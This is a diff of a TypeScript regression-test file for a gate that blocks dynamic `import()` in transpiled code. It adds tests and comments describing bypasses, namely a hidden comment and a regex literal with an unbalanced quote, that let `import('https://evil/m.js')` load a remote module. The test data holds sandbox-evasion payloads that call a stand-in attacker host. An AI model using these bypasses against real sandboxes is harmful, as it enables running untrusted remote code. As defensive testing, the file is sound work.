@@ -254,9 +254,10 @@ async function runTests(): Promise<void> {
      * SEC-31/SEC-04 regression. Sucrase preserves comments, so the pre-fix gate
      * `/(^|[^.\w])import\s*\(/` (whose `\s*` can't match a comment) let
      * `import/**\/('https://evil/m.js')` slip through to a real module loader.
-     * The comment-neutralizing scan must now catch it. This assertion FAILS on
-     * the pre-fix code (the snippet transpiles to { js }, no error) and PASSES
-     * after. `_transform: id` preserves the comment so the gate sees the escape.
+     * The AST gate catches it (a comment can't hide an `import(` from the
+     * parser). This assertion FAILS on the pre-fix code (the snippet transpiles
+     * to { js }, no error) and PASSES after. `_transform: id` preserves the
+     * comment so the gate sees the escape.
      */
     {
         const id = (s: string): string => s;
@@ -288,10 +289,37 @@ async function runTests(): Promise<void> {
             blockGap,
         );
 
-        // A NON-dynamic member access named `import` (e.g. `foo.import(x)`) or a
-        // string that merely CONTAINS "import(" must NOT be falsely rejected —
-        // the neutralizer blanks string bodies and the `[^.\w]` guard skips
-        // member access, so these still transpile to { js }.
+        // REGEX-LITERAL REGRESSION (the reason the gate is AST-based). The prior
+        // comment/string-blanking lexer did NOT track regex literals: a regex
+        // carrying an unbalanced quote read as a string start, so the lexer
+        // desynced and blanked the REAL `import(` that followed — passing the
+        // escape through. e.g. `const re = /'/; import('https://evil/m.js')`
+        // neutralized to `const re = /            https:` (no `import(` left to
+        // match). The AST gate is immune: the parser knows `/'/` is a regex and
+        // `import(...)` an ImportExpression. Both FAIL on the pre-fix lexer gate.
+        const regexSquote = await transpile(
+            `const re = /'/; import('https://evil/m.js');`,
+            { _transform: id },
+        );
+        assert(
+            "(f) regex-literal `/'/` cannot hide a following dynamic import → { error }",
+            'error' in regexSquote,
+            regexSquote,
+        );
+        const regexDquote = await transpile(
+            `const re = /"/; import("https://evil/m.js");`,
+            { _transform: id },
+        );
+        assert(
+            '(f) regex-literal `/"/` cannot hide a following dynamic import → { error }',
+            'error' in regexDquote,
+            regexDquote,
+        );
+
+        // A NON-dynamic member access named `import` (`foo.import(x)`, a
+        // MemberExpression) or a string that merely CONTAINS "import(" (a string
+        // Literal) is not an ImportExpression, so the AST gate does NOT reject it —
+        // these still transpile to { js }.
         const memberOk = await transpile(`foo.import('x');`, {
             _transform: id,
         });
